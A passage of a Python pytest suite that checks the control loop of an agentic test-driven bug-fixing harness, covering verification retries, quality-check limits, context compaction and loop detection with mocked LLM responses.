            },
            "llm": {"model": "test-model"},
            "timeouts": {"llm_request": 10, "tool_execution": 10, "test_run": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages, include_tools=True: {
            "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
            "usage": {},
            "timings": {},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if len(cmd) >= 2 and cmd[-1] == "diff":
                raise subprocess.TimeoutExpired(cmd, 10)
            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        result = main()

        assert result == 0
        events = [event for event, _data in logged]
        assert "done" in events
        assert "postamble_error" in events
        assert "exhausted" not in events

    def test_done_retry_preserves_assistant_message(self, tmp_path, monkeypatch):
        chat_calls = []
        verify_calls = []
        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        config = {
            "agent": {"max_steps": 2, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"llm_request": 10, "tool_execution": 10, "test_run": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }

        def fake_chat(messages, include_tools=True):
            chat_calls.append([dict(msg) for msg in messages])
            return {
                "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        def fake_verify(test_file):
            verify_calls.append(test_file)
            if len(verify_calls) == 1:
                return False, "verification failed"
            return True, "verified"

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", fake_verify)
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        assert len(chat_calls) == 2
        retry_messages = chat_calls[1]
        assert any(msg.get("content") == "DONE" for msg in retry_messages)
        assert retry_messages[-1]["content"] == "verification failed"

    def test_logs_full_issue_text_on_start(self, tmp_path, monkeypatch):
        logged = []
        issue = "A" * 400
        config = {
            "agent": {"max_steps": 0},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "continue",
                "no_test_found": "no test",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue=issue,
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))

        result = main()

        assert result == 1
        start_logs = [data for event, data in logged if event == "start"]
        assert len(start_logs) == 1
        assert start_logs[0]["issue"] == issue

    def test_reverifies_after_quality_pass(self, tmp_path, monkeypatch):
        config = {
            "agent": {"max_steps": 1},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": True, "max_fix_rounds": 3},
            "prompt": {
                "system": "system prompt",
                "nudge": "continue",
                "no_test_found": "no test",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )
        verify_calls = []

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *args, **kwargs: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages: {
            "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
            "usage": {},
            "timings": {},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda test_file: (True, "All quality checks passed"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        def fake_verify(test_file):
            verify_calls.append(test_file)
            return True, "verified"

        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", fake_verify)

        result = main()

        assert result == 0
        assert verify_calls == ["src/file.test.ts", "src/file.test.ts"]

    def _make_auto_trigger_config(self):
        return {
            "agent": {"max_steps": 5, "max_tool_output": 8000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": True},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"tool_execution": 10},
        }

    def _make_chat_with_tool_call(self, step_count, command="bun test src/file.test.ts"):
        def chat_fn(messages, include_tools=True):
            step_count[0] += 1
            if step_count[0] == 1:
                return {
                    "choices": [{"message": {
                        "content": None,
                        "tool_calls": [{
                            "id": "call_1",
                            "function": {
                                "name": "run_command",
                                "arguments": '{"command": "' + command + '"}',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {},
                    "timings": {},
                }
            return {
                "choices": [{"message": {"content": "still going"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }
        return chat_fn

    def test_auto_triggers_verify_when_test_exits_zero(self, tmp_path, monkeypatch):
        """Harness auto-triggers verify→quality→done when test runner exits 0."""
        import agentic_tdd_runner.agent as _agent_mod
        verify_calls = []
        step_count = [0]

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = 0
            return "bun test v1.3.5\n\n 3 pass\n 0 fail\nRan 3 tests across 1 file.\n"

        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count))
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda tf: (True, "All quality checks passed"))
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (verify_calls.append(tf), (True, "verified"))[1])

        result = main()

        assert result == 0, "Harness should auto-complete when tests pass"
        assert len(verify_calls) >= 1, "Verify should have been called automatically"
        assert step_count[0] == 1, f"Model should only have been called once, got {step_count[0]}"

    def test_no_auto_trigger_when_test_exits_nonzero(self, tmp_path, monkeypatch):
        """Harness must NOT auto-trigger verify when test runner crashes (exit != 0)."""
        import agentic_tdd_runner.agent as _agent_mod
        verify_calls = []
        step_count = [0]

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = 1  # test failed
            return "# Unhandled error between tests\nError: deepseek requires an API key\n"

        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config())
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count))
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda tf: (True, "All quality checks passed"))
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (verify_calls.append(tf), (True, "verified"))[1])

        result = main()

        # Should exhaust steps without auto-triggering verify
        assert result == 1, "Should not auto-complete on failed tests"
        assert len(verify_calls) == 0, f"Verify should NOT have been called, got {verify_calls}"

    def test_quality_rounds_give_up_at_max_fix_rounds(self, tmp_path, monkeypatch):
        """Quality iterations should stop at max_fix_rounds instead of burning the step budget."""
        quality_call_count = 0

        def quality_always_fails(test_file):
            nonlocal quality_call_count
            quality_call_count += 1
            return False, f"QUALITY FAIL #{quality_call_count}"

        config = {
            "agent": {"max_steps": 10},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": True, "max_fix_rounds": 3},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *args, **kwargs: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", lambda messages, include_tools=True: {
            "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
            "usage": {},
            "timings": {},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", quality_always_fails)
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 1, "Agent should give up once quality reaches max_fix_rounds"
        assert quality_call_count == 3, f"Expected 3 quality calls, got {quality_call_count}"

    def test_quality_fail_compacts_context_before_retry_when_context_is_tight(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        chat_calls = []
        quality_call_count = 0
        logged = []

        config = self._make_auto_trigger_config()
        config["agent"]["max_steps"] = 3

        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        def fake_chat(messages, include_tools=True):
            chat_calls.append(messages)
            if len(chat_calls) == 1:
                return {
                    "choices": [{"message": {
                        "content": None,
                        "tool_calls": [{
                            "id": "call_1",
                            "function": {
                                "name": "run_command",
                                "arguments": '{"command": "bun test src/file.test.ts"}',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {"prompt_tokens": 30000},
                    "timings": {},
                }

            assert [msg["role"] for msg in messages] == ["system", "user", "user"]
            assert messages[1]["content"] == "Fix this bug:\n\nbug text"
            assert "Verification already passed for src/file.test.ts" in messages[2]["content"]
            assert "QUALITY FAIL #1" in messages[2]["content"]

            return {
                "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = 0
            return "bun test v1.3.5\n\n 3 pass\n 0 fail\n"

        def quality_fails_then_passes(_test_file):
            nonlocal quality_call_count
            quality_call_count += 1
            if quality_call_count == 1:
                return False, "QUALITY FAIL #1"
            return True, "All quality checks passed"

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", quality_fails_then_passes)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        assert quality_call_count == 2
        events = [event for event, _data in logged]
        assert "context_compacted" in events

    def test_quality_fail_preserves_context_when_prompt_has_headroom(self, tmp_path, monkeypatch):
        import agentic_tdd_runner.agent as _agent_mod

        chat_calls = []
        quality_call_count = 0
        logged = []

        config = self._make_auto_trigger_config()
        config["agent"]["max_steps"] = 3

        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        def fake_chat(messages, include_tools=True):
            chat_calls.append(messages)
            if len(chat_calls) == 1:
                return {
                    "choices": [{"message": {
                        "content": None,
                        "tool_calls": [{
                            "id": "call_1",
                            "function": {
                                "name": "run_command",
                                "arguments": '{"command": "bun test src/file.test.ts"}',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {"prompt_tokens": 9131},
                    "timings": {},
                }

            assert [msg["role"] for msg in messages[-2:]] == ["tool", "user"]
            assert "bun test v1.3.5" in messages[-2]["content"]
            assert "Verification already passed for src/file.test.ts" in messages[-1]["content"]
            assert "QUALITY FAIL #1" in messages[-1]["content"]
            assert messages[0]["content"] == "system prompt"
            assert messages[1]["content"] == "Fix this bug:\n\nbug text"

            return {
                "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
                "usage": {"prompt_tokens": 9500},
                "timings": {},
            }

        def fake_execute(name, args):
            _agent_mod._last_run_exit_code = 0
            return "bun test v1.3.5\n\n 3 pass\n 0 fail\n"

        def quality_fails_then_passes(_test_file):
            nonlocal quality_call_count
            quality_call_count += 1
            if quality_call_count == 1:
                return False, "QUALITY FAIL #1"
            return True, "All quality checks passed"

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", quality_fails_then_passes)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        assert quality_call_count == 2
        events = [event for event, _data in logged]
        assert "context_preserved" in events
        assert "context_compacted" not in events

    def test_loop_detection_nudges_after_three_identical_exploratory_tools(self, tmp_path, monkeypatch):
        logged = []
        chat_calls = []

        config = {
            "agent": {"max_steps": 4, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"tool_execution": 10, "llm_request": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        def fake_chat(messages, include_tools=True):
            chat_calls.append([dict(msg) for msg in messages])
            if len(chat_calls) <= 3:
                return {
                    "choices": [{"message": {
                        "content": None,
                        "tool_calls": [{
                            "id": f"call_{len(chat_calls)}",
                            "function": {
                                "name": "read_file",
                                "arguments": '{"path": "src/file.ts"}',
                            },
                        }],
                    }, "finish_reason": "tool_calls"}],
                    "usage": {},
                    "timings": {},
                }

            return {
                "choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}],
                "usage": {},
                "timings": {},
            }

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", lambda name, args: "file contents")
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        events = [event for event, _data in logged]
        assert "loop_detected" in events
        assert any(
            msg.get("role") == "user" and "repeated the same exploratory tool call" in msg.get("content", "")
            for msg in chat_calls[3]
        )

    def test_loop_streak_survives_failed_edit_between_exploratory_reads(self, tmp_path, monkeypatch):
        """Common stall pattern: read_file → failed str_replace_editor → read_file → read_file.
        The failed edit doesn't change anything on disk, so it should not break the
        exploratory streak. Only a successful edit (applied is True) means progress
        was made. Without this, the loop guard misses the most common stall shape:
        the model rereading the same file because its edits keep failing."""
        logged = []
        chat_calls = []

        config = {
            "agent": {"max_steps": 5, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"tool_execution": 10, "llm_request": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )

        # Plan: read(A) → read(A) → failed str_replace_editor → read(A) → DONE.
        # Three reads of A interleaved by a failed edit must trigger loop_detected.
        def fake_chat(messages, include_tools=True):
            chat_calls.append([dict(msg) for msg in messages])
            if len(chat_calls) in (1, 2, 4):
                return {"choices": [{"message": {"content": None, "tool_calls": [
                    {"id": f"c{len(chat_calls)}", "function": {
                        "name": "read_file", "arguments": '{"path": "src/file.ts"}',
                    }},
                ]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            if len(chat_calls) == 3:
                return {"choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c3", "function": {
                        "name": "str_replace_editor",
                        "arguments": '{"path": "src/file.ts", "old": "x", "new": "y"}',
                    }},
                ]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            return {"choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}], "usage": {}, "timings": {}}

        # Failed edit returns anything not starting with "OK:" → applied is False.
        def fake_execute(name, args):
            if name == "str_replace_editor":
                return "ERROR: old string not found"
            return "file contents"

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        main()

        events = [event for event, _data in logged]
        assert "loop_detected" in events, (
            "Three identical exploratory reads with a failed (non-applied) edit "
            "in between should still trip the loop guard. The failed edit didn't "
            "change anything, so the streak shouldn't reset."
        )

    def test_loop_warning_appended_after_all_tool_results_in_multi_tool_call(self, tmp_path, monkeypatch):
        """When a single assistant turn returns multiple tool_calls AND triggers loop
        detection mid-iteration, the warning user message must come AFTER all sibling
        tool results — never interleaved between them.

        OpenAI's tool_calls API requires every assistant(tool_calls) to be followed by
        exactly N contiguous role=tool messages (one per call). Inserting role=user
        between siblings yields assistant→tool→user→tool, which the next chat call
        will reject (or worse, silently misinterpret)."""
        logged = []
        chat_calls = []

        config = {
            "agent": {"max_steps": 4, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"tool_execution": 10, "llm_request": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        # Plan: turns 1, 2 each issue ONE read_file (priming the loop counter to 2),
        # then turn 3 issues TWO tool_calls — first one is the same read_file
        # (triggers loop detection), second is a different read_file. The warning
        # must NOT split the two tool results.
        def fake_chat(messages, include_tools=True):
            chat_calls.append([dict(msg) for msg in messages])
            if len(chat_calls) == 1:
                return {"choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c1", "function": {"name": "read_file", "arguments": '{"path": "src/file.ts"}'}},
                ]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            if len(chat_calls) == 2:
                return {"choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c2", "function": {"name": "read_file", "arguments": '{"path": "src/file.ts"}'}},
                ]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            if len(chat_calls) == 3:
                return {"choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c3a", "function": {"name": "read_file", "arguments": '{"path": "src/file.ts"}'}},
                    {"id": "c3b", "function": {"name": "read_file", "arguments": '{"path": "src/other.ts"}'}},
                ]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            return {"choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}], "usage": {}, "timings": {}}

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", lambda name, args: "file contents")
        monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
        monkeypatch.setattr("agentic_tdd_runner.agent.verify_red_green", lambda tf: (True, "verified"))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda *args, **kwargs: subprocess.CompletedProcess(args[0], 0, stdout="", stderr=""),
        )

        result = main()

        assert result == 0
        events = [event for event, _data in logged]
        assert "loop_detected" in events, "loop should still be detected on the multi-call turn"

        # Inspect the messages sent to the 4th chat call — that snapshot reflects
        # what was appended after the multi-tool-call turn finished.
        snapshot = chat_calls[3]
        # Find the assistant message with tool_calls c3a + c3b. The raw LLM
        # response dict doesn't carry an explicit role field, so identify it by
        # the presence of the c3a tool_call.
        idx = next(
            i for i, m in enumerate(snapshot)
            if any(tc.get("id") == "c3a" for tc in (m.get("tool_calls") or []))
        )
        # Next message MUST be the tool result for c3a, then c3b — contiguous.
        assert snapshot[idx + 1].get("role") == "tool"
        assert snapshot[idx + 1].get("tool_call_id") == "c3a"
        assert snapshot[idx + 2].get("role") == "tool", (
            "Loop warning split sibling tool results: "
            f"got role={snapshot[idx + 2].get('role')!r} between c3a and c3b"
        )
        assert snapshot[idx + 2].get("tool_call_id") == "c3b"
        # The user warning, if present, must come AFTER both tool results.
        assert snapshot[idx + 3].get("role") == "user"
        assert "repeated the same exploratory tool call" in snapshot[idx + 3].get("content", "")

    def test_non_apply_step_warning_after_distinct_exploratory_steps(self, tmp_path, monkeypatch):
        """Distinct read/search commands can still be unproductive if no step edits files."""
        logged = []
        chat_calls = []

        config = {
            "agent": {
                "max_steps": 4,
                "max_tool_output": 2000,
                "non_apply_step_warning_threshold": 3,
            },
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"tool_execution": 10, "llm_request": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }
        args = SimpleNamespace(
            issue="bug text",
            source=None,
            symbol=None,
            workdir=str(tmp_path),
            config="unused.toml",
            log_dir=str(tmp_path),
        )

        def fake_chat(messages, include_tools=True):
            chat_calls.append([dict(msg) for msg in messages])
            turn = len(chat_calls)
            if turn <= 3:
                return {"choices": [{"message": {"content": None, "tool_calls": [{
                    "id": f"c{turn}",
                    "function": {
                        "name": "run_command",
                        "arguments": '{"command": "rg needle%s src"}' % turn,
                    },
                }]}, "finish_reason": "tool_calls"}], "usage": {}, "timings": {}}
            return {"choices": [{"message": {"content": "DONE"}, "finish_reason": "stop"}], "usage": {}, "timings": {}}

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
